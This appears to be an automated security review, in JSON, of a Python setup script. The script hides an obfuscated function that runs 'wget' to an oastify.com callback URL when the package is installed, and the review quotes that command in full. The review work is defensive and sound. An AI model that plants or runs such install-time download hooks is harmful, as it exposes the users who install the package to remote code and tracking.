{
  "purpose": "The code appears to be designed to set up a Python package, but it also executes a system command to download a file from a potentially malicious URL.",
  "sources": "os.system call executing 'wget https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test'",
  "sinks": "The 'wget' command fetches data from an external URL, which could lead to code execution if the downloaded content is executed or used maliciously.",
  "flows": "The code calls the function 'nrqRELqblwoCCnBBPSWaGcgdAaSgnaMi', which executes the 'wget' command, creating a flow from the source (system call) to the potential effect of downloading remote content.",
  "anomalies": "The function name appears obfuscated and meaningless, which is often used to hide malicious intent. The 'wget' URL is external and suspicious, indicating potential malicious activity. The code does not handle or verify the downloaded content.",
  "analysis": "The script imports 'os' and 'setuptools', then defines a function with an obfuscated name that runs a 'wget' command to download a file from a suspicious URL. This function is immediately called after definition. The use of obfuscated naming and the external download link are typical signs of malicious intent, such as establishing a backdoor or retrieving malicious payloads. The code does not perform any validation or safeguard against malicious downloads, and the download URL is hosted on a suspicious domain, raising concern about potential remote code execution or data exfiltration.",
  "conclusion": "This code exhibits clear malicious behavior by downloading external content without verification, likely to facilitate malicious activities such as remote code execution or data theft. The obfuscated function name and suspicious URL strongly suggest malicious intent. It should be considered unsafe and potentially malicious.",
